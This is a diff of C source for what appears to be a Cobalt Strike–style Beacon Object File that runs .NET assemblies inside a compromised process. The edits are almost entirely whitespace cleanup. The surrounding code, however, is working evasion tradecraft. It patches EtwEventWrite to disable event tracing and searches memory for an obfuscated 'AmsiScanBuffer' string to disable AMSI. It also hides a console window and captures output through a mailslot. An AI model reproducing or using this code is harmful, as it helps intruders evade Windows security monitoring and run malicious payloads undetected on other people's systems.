@@ -55,41 +55,41 @@ static void PerformCleanup(PCLEANUP_CONTEXT ctx, BOOL frConsole, BOOL revertETW)
     if (ctx->wAssemblyArguments) { MSVCRT$free(ctx->wAssemblyArguments); }
     if (ctx->wAppDomain) { MSVCRT$free(ctx->wAppDomain); }
     if (ctx->returnData) { intFree(ctx->returnData); }
-    
+
     // Free library handles
     if (ctx->hUser32) { KERNEL32$FreeLibrary(ctx->hUser32); }
-    
+
     // Close handles
     if (ctx->mainHandle != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->mainHandle); }
     if (ctx->hFile != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->hFile); }
     if (ctx->hEvent != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->hEvent); }
-    
+
     // Clean up COM objects
     if (ctx->pSafeArray) { OLEAUT32$SafeArrayDestroy(ctx->pSafeArray); }
     if (ctx->psaStaticMethodArgs) { OLEAUT32$SafeArrayDestroy(ctx->psaStaticMethodArgs); }
-    
+
     OLEAUT32$VariantClear(&ctx->vtPsa);
     OLEAUT32$VariantClear(&ctx->retVal);
     OLEAUT32$VariantClear(&ctx->obj);
-    
+
     if (ctx->pMethodInfo) { ctx->pMethodInfo->lpVtbl->Release(ctx->pMethodInfo); }
     if (ctx->pAssembly) { ctx->pAssembly->lpVtbl->Release(ctx->pAssembly); }
     if (ctx->pAppDomain) { ctx->pAppDomain->lpVtbl->Release(ctx->pAppDomain); }
     if (ctx->pAppDomainThunk) { ctx->pAppDomainThunk->lpVtbl->Release(ctx->pAppDomainThunk); }
-    
+
     if (ctx->pICorRuntimeHost && ctx->pAppDomainThunk) {
         ctx->pICorRuntimeHost->lpVtbl->UnloadDomain(ctx->pICorRuntimeHost, ctx->pAppDomainThunk);
     }
     if (ctx->pICorRuntimeHost) { ctx->pICorRuntimeHost->lpVtbl->Release(ctx->pICorRuntimeHost); }
     if (ctx->pClrRuntimeInfo) { ctx->pClrRuntimeInfo->lpVtbl->Release(ctx->pClrRuntimeInfo); }
     if (ctx->pClrMetaHost) { ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost); }
-    
+
     // Free console if we created one
     if (frConsole) {
         _FreeConsole FreeConsole = (_FreeConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "FreeConsole");
         if (FreeConsole) { FreeConsole(); }
     }
-    
+
     // Revert ETW if requested
     if (revertETW) {
         BOOL success = patchETW(revertETW);
@@ -103,10 +103,10 @@ static void PerformCleanup(PCLEANUP_CONTEXT ctx, BOOL frConsole, BOOL revertETW)
 BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
 {
     *mailHandle = KERNEL32$CreateMailslotA(lpszSlotName,
-        0,                             //No maximum message size 
-        MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
+        0,                             //No maximum message size
+        MAILSLOT_WAIT_FOREVER,         //No time-out for operations
         (LPSECURITY_ATTRIBUTES)NULL);  //Default security
-        
+
     if (*mailHandle == INVALID_HANDLE_VALUE)
     {
         return FALSE;
@@ -126,7 +126,7 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
     OVERLAPPED ov;
     size_t totalWritten = 0;
     BOOL chunkingMode = FALSE;
-    
+
     // Intermediate buffer for chunking mode
     char* chunkBuffer = NULL;
     size_t chunkBufferSize = CHUNK_SIZE;
@@ -136,13 +136,13 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
     if (NULL == hEvent) {
         return FALSE;
     }
-    
+
     *hEventOut = hEvent;
-    
+
     ov.Offset = 0;
     ov.OffsetHigh = 0;
     ov.hEvent = hEvent;
-    
+
     while (TRUE) {
         fResult = KERNEL32$GetMailslotInfo(*mailHandle,
             (LPDWORD)NULL,
@@ -159,7 +159,7 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
         if (cbMessage == MAILSLOT_NO_MESSAGE) {
             break;
         }
-        
+
         lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, cbMessage + 1);
         if (NULL == lpszBuffer) {
             if (chunkBuffer) MSVCRT$free(chunkBuffer);
@@ -182,10 +182,10 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
 
         // Ensure null termination
         lpszBuffer[cbRead] = '\0';
-        
+
         // Get actual string length
         size_t msgLen = MSVCRT$strlen(lpszBuffer);
-        
+
         // Check if message ends with newline
         BOOL hasNewline = FALSE;
         if (msgLen > 0) {
@@ -193,18 +193,18 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
                 hasNewline = TRUE;
             }
         }
-        
+
         if (!chunkingMode && totalWritten + msgLen + (hasNewline ? 0 : 1) < outputSize - 1) {
             // Normal buffer mode
             MSVCRT$memcpy(output + totalWritten, lpszBuffer, msgLen);
             totalWritten += msgLen;
-            
+
             // Add newline if message doesn't have one
             if (!hasNewline && msgLen > 0) {
                 output[totalWritten] = '\n';
                 totalWritten++;
             }
-            
+
             output[totalWritten] = '\0';
         } else {
             // Switch to or continue in chunking mode
@@ -213,7 +213,7 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
                 chunkingMode = TRUE;
                 output[totalWritten] = '\0';
                 BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s", output);
-                
+
                 // Allocate intermediate chunk buffer
                 chunkBuffer = (char*)MSVCRT$malloc(chunkBufferSize);
                 if (!chunkBuffer) {
@@ -223,24 +223,24 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
                 }
                 chunkBufferUsed = 0;
             }
-            
+
             // Calculate space needed including potential newline
             size_t neededSpace = msgLen + (hasNewline ? 0 : 1);
             size_t spaceLeft = chunkBufferSize - chunkBufferUsed - 1;
-            
+
             if (neededSpace <= spaceLeft) {
                 // Message fits in current chunk buffer
                 MSVCRT$memcpy(chunkBuffer + chunkBufferUsed, lpszBuffer, msgLen);
                 chunkBufferUsed += msgLen;
-                
+
                 // Add newline if needed
                 if (!hasNewline && msgLen > 0) {
                     chunkBuffer[chunkBufferUsed] = '\n';
                     chunkBufferUsed++;
                 }
-                
+
                 chunkBuffer[chunkBufferUsed] = '\0';
-                
+
                 // Send chunk if buffer is reasonably full (>75% capacity)
                 if (chunkBufferUsed > (chunkBufferSize * 3 / 4)) {
                     BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
@@ -254,7 +254,7 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
                     BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                     chunkBufferUsed = 0;
                 }
-                
+
                 // Check if this single message is larger than our chunk buffer
                 if (neededSpace >= chunkBufferSize - 1) {
                     // Very large single message - send it directly
@@ -267,33 +267,33 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
                     // Normal message - add to empty buffer
                     MSVCRT$memcpy(chunkBuffer, lpszBuffer, msgLen);
                     chunkBufferUsed = msgLen;
-                    
+
                     if (!hasNewline && msgLen > 0) {
                         chunkBuffer[chunkBufferUsed] = '\n';
                         chunkBufferUsed++;
                     }
-                    
+
                     chunkBuffer[chunkBufferUsed] = '\0';
                 }
             }
         }
-        
+
         KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
     }
-    
+
     if (chunkingMode) {
         // Send any remaining data in chunk buffer
         if (chunkBufferUsed > 0) {
             chunkBuffer[chunkBufferUsed] = '\0';
             BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
         }
-        
+
         MSVCRT$free(chunkBuffer);
-        
+
         // Final newline for chunked output
         BeaconPrintf(CALLBACK_OUTPUT, "\n");
     }
-    
+
     KERNEL32$CloseHandle(hEvent);
     return !chunkingMode;  // Return FALSE if chunking was used
 }
@@ -301,7 +301,7 @@ BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE*
 /*Improved version detection for .NET 4.x*/
 BOOL FindVersion(void * assembly, int length) {
     char* assembly_c = (char*)assembly;
-    
+
     // Check for various .NET 4.x versions
     char* v4_versions[] = {
         "v4.0.30319",
@@ -310,12 +310,12 @@ BOOL FindVersion(void * assembly, int length) {
         "v4.7",
         "v4.8"
     };
-    
+
     int num_versions = sizeof(v4_versions) / sizeof(v4_versions[0]);
-    
+
     for (int v = 0; v < num_versions; v++) {
         int version_len = MSVCRT$strlen(v4_versions[v]);
-        
+
         for (int i = 0; i < length - version_len; i++) {
             BOOL found = TRUE;
             for (int j = 0; j < version_len; j++) {
@@ -329,7 +329,7 @@ BOOL FindVersion(void * assembly, int length) {
             }
         }
     }
-    
+
     return 0;  // .NET 2.0
 }
 
@@ -339,7 +339,7 @@ BOOL patchETW(BOOL revertETW)
     unsigned char etwPatch[8] = {0};  // Sufficient size for both architectures
     SIZE_T uSize = 8;
     ULONG patchSize = 0;
-    
+
     if (revertETW != 0) {
 #ifdef _M_AMD64
         //revert ETW x64
@@ -351,7 +351,7 @@ BOOL patchETW(BOOL revertETW)
         etwPatch[0] = 0x8b;
         etwPatch[1] = 0xff;
         etwPatch[2] = 0x55;
-#endif        
+#endif
     }
     else {
 #ifdef _M_AMD64
@@ -364,17 +364,17 @@ BOOL patchETW(BOOL revertETW)
         etwPatch[0] = 0xc2;
         etwPatch[1] = 0x14;
         etwPatch[2] = 0x00;
-#endif            
+#endif
     }
-    
-    //Get pointer to EtwEventWrite 
+
+    //Get pointer to EtwEventWrite
     void* pAddress = (PVOID) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
     if(pAddress == NULL)
     {
         BeaconPrintf(CALLBACK_ERROR , "[!] Getting pointer to EtwEventWrite failed\n");
         return 0;
-    }    
-    
+    }
+
     void* lpBaseAddress = pAddress;
     ULONG OldProtection, NewProtection;
 
@@ -405,7 +405,7 @@ BOOL patchETW(BOOL revertETW)
     return 1;
 }
 
-static BOOL IsReadable(DWORD protect, DWORD state) 
+static BOOL IsReadable(DWORD protect, DWORD state)
 {
     if (!((protect & PAGE_READONLY) == PAGE_READONLY || (protect & PAGE_READWRITE) == PAGE_READWRITE || (protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE || (protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ)) {
         return 0;
@@ -436,7 +436,7 @@ static BOOL search_mem(MEMORY_BASIC_INFORMATION* region, _NtProtectVirtualMemory
         char target_name[] = "AnsiScamBaffer";
         target_name[1] = 'm'; target_name[7] = 'n'; target_name[9] = 'u';
         int target_len = 14;
-        
+
         BOOL found = 1;
         for (int k = 0; k < target_len; k++) {  // Fixed: use target_len instead of sizeof
             if (current[k] != target_name[k]) {
@@ -490,7 +490,7 @@ BOOL patchAMSI()
         }
         pAddress += memInfo.RegionSize;
     }
-    
+
     return (count > 0);
 }
 
@@ -500,7 +500,7 @@ static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRR
     HRESULT hr = (HRESULT)NULL;
 
     hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);
-    
+
     if (hr == S_OK)
     {
         hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
@@ -513,7 +513,7 @@ static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRR
                 hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
                 if (hr == S_OK)
                 {
-                    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);            
+                    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
                 }
                 else
                 {
@@ -575,28 +575,28 @@ void gen_rand_str(char *buffer, int offset, int length)
 }
 
 /*BOF Entry Point*/
-void go(IN PCHAR buffer, IN ULONG blength) 
+void go(IN PCHAR buffer, IN ULONG blength)
 {
     CLEANUP_CONTEXT ctx;
     InitCleanupContext(&ctx);
-    
+
     datap parser;
     BeaconDataParse(&parser, buffer, blength);
 
     size_t assemblyByteLen = 0;
     char* assemblyBytes = BeaconDataExtract(&parser, &assemblyByteLen);
-    
+
     // Extract arguments with length checking
     size_t argumentsLen = 0;
     char* assemblyArguments = BeaconDataExtract(&parser, &argumentsLen);
-    
+
     // Validate arguments - if NULL, zero length, or contains only whitespace, treat as no arguments
     BOOL hasArguments = FALSE;
     if (assemblyArguments != NULL && argumentsLen > 0) {
         // Check if arguments contain any non-whitespace characters
         for (size_t i = 0; i < argumentsLen; i++) {
-            if (assemblyArguments[i] != '\0' && assemblyArguments[i] != ' ' && 
-                assemblyArguments[i] != '\t' && assemblyArguments[i] != '\n' && 
+            if (assemblyArguments[i] != '\0' && assemblyArguments[i] != ' ' &&
+                assemblyArguments[i] != '\t' && assemblyArguments[i] != '\n' &&
                 assemblyArguments[i] != '\r') {
                 hasArguments = TRUE;
                 break;
@@ -608,7 +608,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     char appDomain[TMPBUFLEN] = { 't', 'e', 's', 't', '-' };           gen_rand_str(appDomain, 5, 8);
     char pipeName[TMPBUFLEN]  = { 's', 'v', 'c', 't', 's', 't', '.' }; gen_rand_str(pipeName, 7, 12);
     char slotName[TMPBUFLEN]  = { 't', 's', 't', 's', 'l', 't', '-' }; gen_rand_str(slotName, 7, 8);
-    
+
     BOOL amsi = 1;
     BOOL etw = 1;
     BOOL revertETW = 1;
@@ -625,7 +625,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     MSVCRT$memset(ctx.pipePath, 0, pipeNameLen + 10);
     MSVCRT$memcpy(ctx.pipePath, "\\\\.\\pipe\\", 9 );
     MSVCRT$memcpy(ctx.pipePath+9, pipeName, pipeNameLen+1 );
-    
+
     SIZE_T slotNameLen = MSVCRT$strlen(slotName);
     ctx.slotPath = MSVCRT$malloc(slotNameLen + 14);
     if (!ctx.slotPath) {
@@ -636,7 +636,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     MSVCRT$memset(ctx.slotPath, 0, slotNameLen + 14);
     MSVCRT$memcpy(ctx.slotPath, "\\\\.\\mailslot\\", 13 );
     MSVCRT$memcpy(ctx.slotPath+13, slotName, slotNameLen+1 );
-    
+
     //Declare other variables
     HRESULT hr = (HRESULT)NULL;
     LPWSTR* argumentsArray = NULL;
@@ -647,7 +647,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     size_t wideSize2 = 0;
     BOOL success = 1;
     BOOL frConsole = 0;
-    
+
     // Allocate initial buffer with configurable size
     ctx.returnDataSize = INITIAL_BUFFER_SIZE;
     ctx.returnData = (char*)intAlloc(ctx.returnDataSize);
@@ -657,7 +657,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         return;
     }
     memset(ctx.returnData, 0, ctx.returnDataSize);
-    
+
     //Determine .NET assembly version
     wchar_t* wNetVersion = NULL;
     if(FindVersion((void*)assemblyBytes, assemblyByteLen))
@@ -668,7 +668,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     {
         wNetVersion = L"v2.0.50727";
     }
-    
+
     //Handle argument conversion based on whether we have valid arguments
     if (hasArguments) {
         // Convert assemblyArguments to wide string
@@ -681,7 +681,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
             return;
         }
         MSVCRT$mbstowcs_s(&convertedChars, ctx.wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);
-        
+
         // Parse arguments
         argumentsArray = SHELL32$CommandLineToArgvW(ctx.wAssemblyArguments, &argumentCount);
     } else {
@@ -696,7 +696,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         argumentsArray = NULL;
         argumentCount = 0;
     }
-    
+
     //Convert appDomain to wide string
     size_t convertedChars2 = 0;
     wideSize2 = MSVCRT$strlen(appDomain) + 1;
@@ -721,26 +721,26 @@ void go(IN PCHAR buffer, IN ULONG blength)
             }
         }
     }
-        
+
     //Break ETW
     if (etw != 0 || revertETW != 0) {
-        success = patchETW(0);    
-        
+        success = patchETW(0);
+
         if (success != 1) {
             BeaconPrintf(CALLBACK_ERROR , "[!] Patching ETW failed. Try running without patching ETW");
             PerformCleanup(&ctx, FALSE, FALSE);
             return;
         }
     }
-    
+
     //Start CLR
     success = StartCLR((LPCWSTR)wNetVersion, &ctx.pClrMetaHost, &ctx.pClrRuntimeInfo, &ctx.pICorRuntimeHost);
-    
+
     if (success != 1) {
         PerformCleanup(&ctx, FALSE, revertETW);
         return;
     }
-    
+
     // Create unique mutex for synchronization
     char mutexName[TMPBUFLEN] = { 'm', 'x', '-' };
     gen_rand_str(mutexName, 3, 12);
@@ -759,23 +759,23 @@ void go(IN PCHAR buffer, IN ULONG blength)
 
     KERNEL32$ReleaseMutex(hMutex);
     KERNEL32$CloseHandle(hMutex);
-    
+
     if (ctx.hFile == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open mailslot for writing");
         PerformCleanup(&ctx, FALSE, revertETW);
         return;
     }
-    
+
     //Attach or create console
     BOOL attConsole = consoleExists();
-    
+
     if (attConsole != 1)
     {
-        frConsole = 1; 
+        frConsole = 1;
         _AllocConsole AllocConsole = (_AllocConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "AllocConsole");
         _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
         AllocConsole();
-        
+
         //Hide Console Window
         ctx.hUser32 = KERNEL32$LoadLibraryA("user32.dll");
         if (ctx.hUser32) {
@@ -785,15 +785,15 @@ void go(IN PCHAR buffer, IN ULONG blength)
                 ShowWindow(wnd, SW_HIDE);
         }
     }
-    
+
     //Get current stdout handle
     _GetStdHandle GetStdHandle = (_GetStdHandle) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetStdHandle");
     stdOutput = GetStdHandle(((DWORD)-11));
-    
+
     //Set stdout to our named pipe or mail slot
     _SetStdHandle SetStdHandle = (_SetStdHandle) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "SetStdHandle");
     success = SetStdHandle(((DWORD)-11), ctx.hFile);
-    
+
     //Create our AppDomain
     hr = ctx.pICorRuntimeHost->lpVtbl->CreateDomain(ctx.pICorRuntimeHost, (LPCWSTR)ctx.wAppDomain, NULL, &ctx.pAppDomainThunk);
     if (hr != S_OK) {
@@ -802,7 +802,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         PerformCleanup(&ctx, frConsole, revertETW);
         return;
     }
-    
+
     hr = ctx.pAppDomainThunk->lpVtbl->QueryInterface(ctx.pAppDomainThunk, &xIID_AppDomain, (VOID**)&ctx.pAppDomain);
     if (hr != S_OK) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to query AppDomain interface");
@@ -810,11 +810,11 @@ void go(IN PCHAR buffer, IN ULONG blength)
         PerformCleanup(&ctx, frConsole, revertETW);
         return;
     }
-    
+
     //Patch amsi
     if (amsi != 0) {
-        success = patchAMSI();    
-        
+        success = patchAMSI();
+
         if (success != 1) {
             BeaconPrintf(CALLBACK_ERROR, "[!] Patching AMSI failed. Try running without patching AMSI and using obfuscation");
             SetStdHandle(((DWORD)-11), stdOutput);
@@ -834,7 +834,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         PerformCleanup(&ctx, frConsole, revertETW);
         return;
     }
-    
+
     void* pvData = NULL;
     hr = OLEAUT32$SafeArrayAccessData(ctx.pSafeArray, &pvData);
     if (hr != S_OK) {
@@ -843,7 +843,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         PerformCleanup(&ctx, frConsole, revertETW);
         return;
     }
-    
+
     MSVCRT$memcpy(pvData, assemblyBytes, assemblyByteLen);
     hr = OLEAUT32$SafeArrayUnaccessData(ctx.pSafeArray);
 
@@ -853,15 +853,15 @@ void go(IN PCHAR buffer, IN ULONG blength)
         BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
         SetStdHandle(((DWORD)-11), stdOutput);
         PerformCleanup(&ctx, frConsole, revertETW);
-        return;    
+        return;
     }
-    
+
     hr = ctx.pAssembly->lpVtbl->EntryPoint(ctx.pAssembly, &ctx.pMethodInfo);
     if (hr != S_OK) {
         BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to find entry point of assembly.\n");
         SetStdHandle(((DWORD)-11), stdOutput);
         PerformCleanup(&ctx, frConsole, revertETW);
-        return;    
+        return;
     }
 
     ZeroMemory(&ctx.retVal, sizeof(VARIANT));
@@ -877,15 +877,15 @@ void go(IN PCHAR buffer, IN ULONG blength)
     }
 
     long idx[1] = { 0 };
-    OLEAUT32$SafeArrayPutElement(ctx.psaStaticMethodArgs, idx, &ctx.vtPsa); 
-    
+    OLEAUT32$SafeArrayPutElement(ctx.psaStaticMethodArgs, idx, &ctx.vtPsa);
+
     //Invoke our .NET Method
     hr = ctx.pMethodInfo->lpVtbl->Invoke_3(ctx.pMethodInfo, ctx.obj, ctx.psaStaticMethodArgs, &ctx.retVal);
-    
+
     // Use hybrid reading for mailslots with improved chunking
     BOOL bufferMode = ReadSlotHybrid(ctx.returnData, ctx.returnDataSize, &ctx.mainHandle, &ctx.hEvent);
     ctx.useChunking = !bufferMode;
-    
+
     // Send output only if not already sent in chunks
     if (!ctx.useChunking) {
         BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s\n", ctx.returnData);
@@ -893,7 +893,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
 
     //Revert stdout back to original handles
     SetStdHandle(((DWORD)-11), stdOutput);
-    
+
     //Cleanup everything
     PerformCleanup(&ctx, frConsole, revertETW);
 }
